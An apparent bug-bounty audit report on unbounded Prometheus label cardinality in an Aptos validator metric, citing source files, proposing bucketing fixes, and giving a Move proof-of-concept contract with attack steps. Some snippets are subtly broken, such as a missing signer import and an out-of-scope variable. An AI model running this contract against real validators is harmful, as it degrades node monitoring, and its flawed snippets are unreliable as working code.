# Audit Report

## Title
Unbounded Label Cardinality in PROCESSED_USER_TXNS_CORE_EVENTS Metric Causes Resource Exhaustion

## Summary
When the `processed_transactions_detailed_counters` configuration is enabled, the PROCESSED_USER_TXNS_CORE_EVENTS metric creates unique Prometheus labels for each event creation_number. An attacker can create thousands of event handles with sequential creation_numbers, causing metric label cardinality explosion and potential memory exhaustion on affected validator nodes.

## Finding Description

The vulnerability exists in the metrics collection system that tracks processed transactions. [1](#0-0) 

When processing transaction outputs, the code iterates through all events and creates metric labels based on the creation_number from V1 events: [2](#0-1) 

When `detailed_counters` is enabled (controlled by the `processed_transactions_detailed_counters` configuration), the code converts each creation_number to a string and uses it as a metric label without any aggregation or limiting. [3](#0-2) 

The configuration option defaults to false but can be enabled by validators: [4](#0-3) 

An attacker can exploit this by creating many event handles in their Move contracts. Each event handle created through the framework increments the account's `guid_creation_num` counter: [5](#0-4) 

The creation_number is stored in the GUID structure: [6](#0-5) 

While there is a maximum limit, it is extremely large: [7](#0-6) 

This allows an attacker to create millions of unique event handles with sequential creation_numbers (0, 1, 2, 3, ..., N), and when events are emitted from these handles, each unique creation_number creates a new Prometheus time series, leading to memory exhaustion.

## Impact Explanation

This vulnerability causes **resource exhaustion** on validator nodes that have enabled the `processed_transactions_detailed_counters` feature. 

**Impact Category: Medium Severity**

According to Aptos bug bounty criteria, this falls under Medium severity as it causes:
- Resource exhaustion requiring operational intervention
- Validator node performance degradation through metrics system overload
- Potential crashes of the Prometheus monitoring system due to excessive memory consumption from unbounded label cardinality

While Prometheus label cardinality explosions are well-documented DoS vectors in production systems, the impact is limited because:
1. The feature must be explicitly enabled (default is disabled)
2. The attack requires significant gas expenditure
3. Only metrics collection is affected, not consensus or execution

## Likelihood Explanation

**Likelihood: Medium-Low**

The attack is feasible but has constraints:

**Favorable factors for attackers:**
- Creating event handles is a legitimate operation
- No special privileges required
- Event handles can be stored in Move resources across multiple transactions
- The limit of 1+ quadrillion GUIDs per account is effectively unlimited

**Limiting factors:**
- Only affects validators with non-default configuration enabled
- Requires substantial gas payment to create thousands of event handles
- Each event handle must be stored in a resource (storage costs)
- Attack is easily detectable through monitoring

A determined attacker with sufficient funds could create 10,000-100,000 unique event handles across multiple transactions, which would be sufficient to cause significant metric cardinality issues on affected validators.

## Recommendation

Implement label cardinality protection by bucketing or aggregating creation_numbers instead of using raw values as labels:

**Option 1: Disable detailed creation_number tracking for user events**
```rust
let creation_number = match event {
    ContractEvent::V1(v1) => {
        let is_core = v1.key().get_creator_address() == CORE_CODE_ADDRESS;
        if detailed_counters && is_core {
            // Only track detailed creation numbers for core framework events
            v1.key().get_creation_number().to_string()
        } else {
            "event".to_string()
        }
    },
    ContractEvent::V2(_v2) => "event".to_string(),
};
```

**Option 2: Bucket creation_numbers into ranges**
```rust
let creation_number = if detailed_counters {
    // Bucket into ranges to limit cardinality
    let cn = v1.key().get_creation_number();
    if cn < 100 {
        cn.to_string()
    } else if cn < 1000 {
        "100-999".to_string()
    } else if cn < 10000 {
        "1000-9999".to_string()
    } else {
        "10000+".to_string()
    }
} else {
    "event".to_string()
}
```

**Option 3: Add cardinality limit with overflow bucket**
```rust
// Only track first N unique creation numbers, aggregate rest
const MAX_TRACKED_CREATION_NUMBERS: u64 = 1000;
let creation_number = if detailed_counters {
    let cn = v1.key().get_creation_number();
    if cn < MAX_TRACKED_CREATION_NUMBERS {
        cn.to_string()
    } else {
        "overflow".to_string()
    }
} else {
    "event".to_string()
}
```

## Proof of Concept

```move
module attacker::cardinality_attack {
    use aptos_framework::account;
    use aptos_framework::event;
    use std::vector;

    struct EventHandleStore has key {
        handles: vector<event::EventHandle<AttackEvent>>
    }

    struct AttackEvent has drop, store {
        data: u64
    }

    /// Create many event handles to cause metric cardinality explosion
    public entry fun create_many_handles(attacker: &signer, count: u64) acquires EventHandleStore {
        let addr = signer::address_of(attacker);
        
        if (!exists<EventHandleStore>(addr)) {
            move_to(attacker, EventHandleStore {
                handles: vector::empty()
            });
        };
        
        let store = borrow_global_mut<EventHandleStore>(addr);
        
        // Create 'count' event handles, each with unique creation_number
        let i = 0;
        while (i < count) {
            let handle = account::new_event_handle<AttackEvent>(attacker);
            vector::push_back(&mut store.handles, handle);
            i = i + 1;
        };
    }

    /// Emit events from all stored handles to trigger metric collection
    public entry fun emit_from_all_handles(attacker: &signer) acquires EventHandleStore {
        let addr = signer::address_of(attacker);
        let store = borrow_global_mut<EventHandleStore>(addr);
        
        let len = vector::length(&store.handles);
        let i = 0;
        while (i < len) {
            let handle = vector::borrow_mut(&mut store.handles, i);
            event::emit_event(handle, AttackEvent { data: i });
            i = i + 1;
        };
    }
}
```

**Attack execution:**
1. Attacker deploys the contract
2. Calls `create_many_handles(attacker, 10000)` across multiple transactions (due to gas limits)
3. Each call creates hundreds of event handles with sequential creation_numbers
4. Calls `emit_from_all_handles(attacker)` to emit events
5. Validators with `processed_transactions_detailed_counters=true` create 10,000+ unique metric labels
6. Prometheus memory consumption grows unbounded, causing performance degradation or crashes

**Notes**

This vulnerability only affects validators that explicitly enable `processed_transactions_detailed_counters` in their node configuration. The default configuration has this feature disabled, which mitigates the risk for most validators. [8](#0-7) 

The issue is not about "arbitrary" creation_number values (attackers cannot choose specific values like 999999), but rather the ability to create many sequential values that each generate unique metric labels. The Aptos Framework properly controls creation_number generation through the account's guid_creation_num counter, preventing direct manipulation. [9](#0-8)

### Citations

**File:** execution/executor/src/metrics.rs (L216-223)
```rust
pub static PROCESSED_USER_TXNS_CORE_EVENTS: Lazy<IntCounterVec> = Lazy::new(|| {
    register_int_counter_vec!(
        "aptos_processed_user_transactions_core_events",
        "Counter of processed EntryFunction user transaction for core address by method",
        &["is_detailed", "process", "account", "creation_number"]
    )
    .unwrap()
});
```

**File:** execution/executor/src/metrics.rs (L270-271)
```rust
    let detailed_counters = AptosVM::get_processed_transactions_detailed_counters();
    let detailed_counters_label = if detailed_counters { "true" } else { "false" };
```

**File:** execution/executor/src/metrics.rs (L488-508)
```rust
        for event in output.events() {
            let (is_core, creation_number) = match event {
                ContractEvent::V1(v1) => (
                    v1.key().get_creator_address() == CORE_CODE_ADDRESS,
                    if detailed_counters {
                        v1.key().get_creation_number().to_string()
                    } else {
                        "event".to_string()
                    },
                ),
                ContractEvent::V2(_v2) => (false, "event".to_string()),
            };
            PROCESSED_USER_TXNS_CORE_EVENTS
                .with_label_values(&[
                    detailed_counters_label,
                    process_type,
                    if is_core { "core" } else { "user" },
                    &creation_number,
                ])
                .inc();
        }
```

**File:** config/src/config/execution_config.rs (L89-89)
```rust
            processed_transactions_detailed_counters: false,
```

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L225-225)
```text
    const MAX_GUID_CREATION_NUM: u64 = 0x4000000000000;
```

**File:** aptos-move/framework/aptos-framework/sources/account/account.move (L1189-1199)
```text
    public fun create_guid(account_signer: &signer): guid::GUID acquires Account {
        let addr = signer::address_of(account_signer);
        ensure_resource_exists(addr);
        let account = &mut Account[addr];
        let guid = guid::create(addr, &mut account.guid_creation_num);
        assert!(
            account.guid_creation_num < MAX_GUID_CREATION_NUM,
            error::out_of_range(EEXCEEDED_MAX_GUID_CREATION_NUM),
        );
        guid
    }
```

**File:** aptos-move/framework/aptos-framework/sources/guid.move (L7-16)
```text
    struct GUID has drop, store {
        id: ID
    }

    /// A non-privileged identifier that can be freely created by anyone. Useful for looking up GUID's.
    struct ID has copy, drop, store {
        /// If creation_num is `i`, this is the `i+1`th GUID created by `addr`
        creation_num: u64,
        /// Address that created the GUID
        addr: address
```

**File:** aptos-move/framework/aptos-framework/sources/guid.move (L23-32)
```text
    public(friend) fun create(addr: address, creation_num_ref: &mut u64): GUID {
        let creation_num = *creation_num_ref;
        *creation_num_ref = creation_num + 1;
        GUID {
            id: ID {
                creation_num,
                addr,
            }
        }
    }
```

**File:** aptos-node/src/utils.rs (L69-74)
```rust
    if node_config
        .execution
        .processed_transactions_detailed_counters
    {
        AptosVM::set_processed_transactions_detailed_counters();
    }
```
